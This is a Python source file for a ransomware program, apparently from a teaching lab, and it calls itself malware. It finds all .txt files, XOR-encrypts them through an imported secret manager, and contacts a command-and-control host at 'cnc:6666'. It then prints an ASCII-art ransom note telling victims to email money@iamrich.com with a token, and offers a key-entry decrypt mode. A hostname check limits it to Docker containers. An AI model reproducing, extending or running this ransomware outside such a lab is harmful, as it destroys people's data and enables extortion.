import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
 
     _.----.                          
       .-"       \-.                       
      /           ; \                      
     :           /:  \                     
     ;         .'  ;  ;                    
     ;      .-"    :  :                    
    :   _.+(   .-- :  :                    
    ;  ;   ' :  :                    
    ;  :           ;  ;                    
    :   ;    -    :  :                     
     )  '   .-.   '  :                     
    (    '. `"' .'   ;                     
     "-._.:`---':-"-.'+'                   
          ;     ;    "                     
   _..__.-. -. (:                          
 ,'   .:(o);     "-._                      
 :    _: 0 ;        \`.                    
 ;  .'/.\-/-.        `:                    
:  : :  -U--:"-.  \    ;                   
;  ; :  ----;   "-.L.-" \                  
'. '  \ ---(      ;O:    ;                 
  \ '. '-;-'      :-:    :                 
   `. ""/         ; :    ;                 
     ""T      .-":  :`. /                  
       :  --""   :   ; Y                   
        ;        ;   : :                   
        :       :     ; ;                  
         ;      :   ; : :                  
         :      ;   :  ; \                 
          ;    :    ;  :  \_               
          :    :        \  \"-.            
          ;    ;         \  `. "-.         
         :    :     c     \   `./"-._      
         ;    :            \    \    "-.   
        :     ;             `.   ;-.  -.`. 
        :    :       __..--"" \  :  `.\.`.\
        ;    :_..--"";  ;  _.-'\  ;   ")))T
       :     ;      _L.-'""     ; :    '-='
       ;    :_..--""            :  ;       
      /     ;                   ;; :       
    .'     /                    ;: J       
    `.    /                     ;'"        
      :-.'         /\           ;          
      ;           /  ;          :          
     :           /   :          :          
     ;          /     ;         :          
    :          /      ;         :          
    ;         /       :         :          
   :         /        :         :



Your text files are currently inaccessible and require a specific action to unlock them. To regain access, you must send an email to the following address: money@iamrich.com. The email's subject line must include a unique token : '{token}' that will be provided to you in order to authenticate your identity and authorize the release of your data.
"""
class Ransomware:

    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        path = Path(".")
        return [str(file) for file in path.rglob(filter)]

    def encrypt(self):
        # List all the .txt files
        txt_files = self.get_files("*.txt")

        # Create an instance of SecretManager
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)

        # Call the setup() method of SecretManager
        secret_manager.setup()

        # Encrypt the files using the xorfiles() method of SecretManager
        secret_manager.xorfiles(txt_files)

        # Display a message for the victim to contact the attacker, including the hex token
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))

    def decrypt(self):
        # Create an instance of SecretManager
        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)

        # Load local cryptographic elements
        secret_manager.load()

        # List all the .txt files
        txt_files = self.get_files("*.txt")

        while True:
            try:
                # Ask for the key
                key = input("Enter the key to decrypt your files: ")

                # Set the key
                secret_manager.set_key(key)

                # Decrypt the files using the xorfiles() method of SecretManager
                secret_manager.xorfiles(txt_files)

                # Clean the local cryptographic files
                secret_manager.clean()

                # Inform the user that the decryption was successful
                print("Decryption successful! Your files have been restored.")

                # Exit the ransomware
                break
            except ValueError:
                # Inform the user that the key is invalid
                print("Invalid key. Please try again.")


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()